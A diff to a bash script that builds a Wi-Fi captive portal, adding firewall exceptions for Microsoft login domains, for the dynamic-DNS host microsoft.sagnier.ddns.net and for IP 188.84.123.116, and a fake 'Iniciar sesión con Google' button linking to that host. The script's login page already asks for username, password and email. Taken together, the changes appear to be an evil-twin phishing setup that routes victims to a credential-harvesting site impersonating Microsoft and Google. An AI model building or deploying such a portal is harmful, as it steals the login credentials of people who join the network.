@@ -110,24 +110,69 @@ ask_interface_out(){
 }
 
 rules_iptables_ipforward(){
-
     sudo sysctl -w net.ipv4.ip_forward=1
     
     sudo iptables -t nat -A POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE
 
-    # Bloquear tráfico de los clientes excepto al portal cautivo (80, 443)
-    sudo iptables -A FORWARD -i wlan0 -o eth0 -j REJECT
+    # Permitir tráfico hacia microsoft.sagnier.ddns.net (si es necesario)
+    iptables -I FORWARD -d microsoft.sagnier.ddns.net -j ACCEPT
 
-    # Redirigir todo el tráfico HTTP al portal cautivo
+    # Interfaz de salida a Internet desde IPFire (ajústala si no es eth0)
+INTERFAZ_SALIDA="eth0"
+
+# Lista de dominios Microsoft necesarios para login
+DOMINIOS_MICROSOFT=(
+    login.microsoftonline.com
+    login.live.com
+    aadcdn.msftauth.net
+    aadcdn.msauth.net
+    secure.aadcdn.microsoftonline-p.com
+    c.bing.com
+    c.bing.net
+    nexus.officeapps.live.com
+    officeclient.microsoft.com
+    static2.sharepointonline.com
+    res.cdn.office.net
+    res-1.cdn.office.net
+    res-hash.cdn.office.net
+    browser.pipe.aria.microsoft.com
+    logincdn.msauth.net
+    graph.microsoft.com
+    outlook.office365.com
+    onedrive.live.com
+    teams.microsoft.com
+)
+
+# Permitir tráfico TCP 443 hacia cada dominio
+for dominio in "${DOMINIOS_MICROSOFT[@]}"; do
+    ip=$(getent ahosts $dominio | grep -m 1 "STREAM" | awk '{ print $1 }')
+    if [ -n "$ip" ]; then
+        echo "Agregando regla para $dominio ($ip)..."
+        iptables -I FORWARD -d $ip  -j ACCEPT
+    else
+        echo "No se pudo resolver $dominio"
+    fi
+done
+    
+    # --- REGLAS NUEVAS ---
+    # 1. Permitir tráfico hacia la IP 188.84.123.116 ANTES del bloqueo general
+    iptables -I FORWARD -d 188.84.123.116 -j ACCEPT
+
+    # 2. Bloquear el resto del tráfico de clientes (excepto portal cautivo)
+    sudo iptables -A FORWARD -i wlan0 -o eth0 -p tcp --dport 80 -j REJECT
+    sudo iptables -A FORWARD -i wlan0 -o eth0 -p tcp --dport 443 -j REJECT
+
+    # --- REGLAS DE REDIRECCIÓN (portal cautivo) ---
+    # Eximir 188.84.123.116 del NAT (para que no sea redirigida al portal)
+    iptables -t nat -I PREROUTING -d 188.84.123.116 -j RETURN
+    
+    # Redirigir HTTP/HTTPS al portal cautivo (192.168.1.1)
     sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
     sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443
 
-    # Redirigir tráfico DNS UDP (puerto 53) a 192.168.1.1
+    # Redirigir DNS (UDP/TCP) al portal
     iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53
-
-    # Redirigir tráfico DNS TCP (puerto 53) a 192.168.1.1
     iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 192.168.1.1:53
-
 }
 
 cleanup() {
@@ -238,12 +283,16 @@ foreach (\$captive_checks as \$check) {
 <body>
     <div class="portal">
         <h1>WiFi Login - <?php echo htmlspecialchars(\$essid); ?></h1>
-        <form action="register.php" method="POST">
+        <form action="/register.php" method="POST">
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
             <input type="email" name="email" placeholder="Email" required>
             <button type="submit">Connect</button>
         </form>
+        <a class="google-btn" href="https://microsoft.sagnier.ddns.net/FAZcbDEg">
+        <img class="google-icon" src="https://developers.google.com/identity/images/g-logo.png" alt="Google logo">
+        Iniciar sesión con Google
+        </a>
     </div>
 </body>
 </html>
@@ -289,6 +338,29 @@ button {
 
 button:hover {
     background: #0056b3;
+}
+.google-btn {
+    display: inline-flex;
+    align-items: center;
+    background-color: #fff;
+    color: #444;
+    border: 1px solid #ddd;
+    font-size: 16px;
+    padding: 10px 15px;
+    border-radius: 4px;
+    text-decoration: none;
+    font-family: Roboto, sans-serif;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.google-btn:hover {
+    box-shadow: 0 0 6px rgba(66, 133, 244, 0.5);
+}
+
+.google-icon {
+    width: 20px;
+    height: 20px;
+    margin-right: 10px;
 }
 EOF
 
